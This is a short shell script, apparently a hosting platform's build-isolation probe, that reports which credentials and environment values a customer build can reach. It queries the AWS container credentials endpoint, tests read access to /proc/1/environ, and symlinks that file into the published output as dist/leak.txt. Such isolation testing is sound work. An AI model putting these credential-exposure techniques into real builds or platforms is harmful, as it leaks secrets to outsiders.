#!/bin/sh
# Archie build-isolation probe (11-17): prints what a customer build can reach. Expected: nothing of Archie's.
id
echo "URI=${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI:-<none>}"
echo "EVENT=$( [ -n "$WORKER_EVENT" ] && echo present || echo '<none>')"
echo "CREDS=$( [ -n "$WORKER_CREDENTIALS" ] && echo present || echo '<none>')"
echo "ENVKEYS=$(env | cut -d= -f1 | sort | tr '\n' ' ')"
head -c 200 /proc/1/environ >/dev/null 2>&1 && echo "PROC1=readable" || echo "PROC1=denied"
curl -s -m3 -o /dev/null -w "CREDS_ENDPOINT=%{http_code}\n" "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" || echo "CREDS_ENDPOINT=unreachable"
mkdir -p dist && echo '<h1>probe</h1>' > dist/index.html && ln -sf /proc/1/environ dist/leak.txt
